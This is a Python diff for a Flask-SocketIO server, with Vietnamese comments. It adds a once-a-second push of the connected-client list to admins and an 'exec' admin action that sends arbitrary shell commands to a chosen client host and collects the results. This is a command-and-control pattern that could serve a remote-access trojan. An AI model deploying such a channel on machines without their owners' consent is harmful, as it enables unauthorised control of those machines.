@@ -20,7 +20,6 @@ CLIENT_TIMEOUT = 15
 # ---------- HTTP ENDPOINTS ----------
 @app.route("/")
 def serve_index():
-    # Trả về file index.html khi truy cập trang chủ
     return send_from_directory('.', 'index.html')
 
 @app.route("/status")
@@ -54,6 +53,19 @@ def notify_admins(event, data):
             socketio.emit("admin_event", payload, to=sid)
         except:
             admins.discard(sid)
+
+# --- LUỒNG TỰ ĐỘNG CẬP NHẬT REALTIME (THÊM MỚI) ---
+def auto_realtime_loop():
+    """Cứ mỗi 1 giây, tự động gửi danh sách mới nhất cho tất cả Admin"""
+    while True:
+        if admins:
+            payload = {"event": "clients", "clients": snapshot_clients()}
+            for sid in list(admins):
+                try:
+                    socketio.emit("admin_event", payload, to=sid)
+                except:
+                    admins.discard(sid)
+        time.sleep(1)
 
 # ---------- SOCKET EVENTS ----------
 @socketio.on("connect")
@@ -122,19 +134,26 @@ def on_admin_command(data):
         else:
             emit("admin_event", {"event": "sent", "ok": False, "error": "client not found"})
     
-    # --- TÍNH NĂNG MỚI: GỬI TIN NHẮN TOÀN BỘ ---
     elif action == "broadcast":
         msg = data.get("message", "")
         if msg:
-            # Gửi tới tất cả các client đang online
             for cid, info in clients.items():
                 socketio.emit("admin_msg", {"message": f"[THÔNG BÁO] {msg}"}, to=info["sid"])
-            
-            # Gửi thông báo tới tất cả admin khác
             notify_admins("broadcast_sent", {"message": msg})
-            
-            # Phản hồi cho admin đang gửi
             emit("admin_event", {"event": "broadcast_sent", "ok": True, "message": msg})
+
+    # Thêm phần exec (Tạo/chạy file)
+    elif action == "exec":
+        target = data.get("client_id")
+        cmd = data.get("command", "")
+        with lock:
+            c = clients.get(target)
+        if c:
+            socketio.emit("exec_command", {"command": cmd, "admin_sid": request.sid}, to=c["sid"])
+            print(f"[ADMIN→{c['hostname']}] EXEC: {cmd}")
+            emit("admin_event", {"event": "exec_sent", "ok": True, "client_id": target})
+        else:
+            emit("admin_event", {"event": "exec_sent", "ok": False, "error": "client not found"})
 
 @socketio.on("exec_result")
 def on_exec_result(data):
@@ -169,5 +188,8 @@ def on_disconnect():
 
 # ---------- MAIN ----------
 if __name__ == "__main__":
+    # Khởi động luồng tự động cập nhật realtime
+    threading.Thread(target=auto_realtime_loop, daemon=True).start()
+    
     port = int(os.environ.get("PORT", 10000))
     socketio.run(app, host="0.0.0.0", port=port)
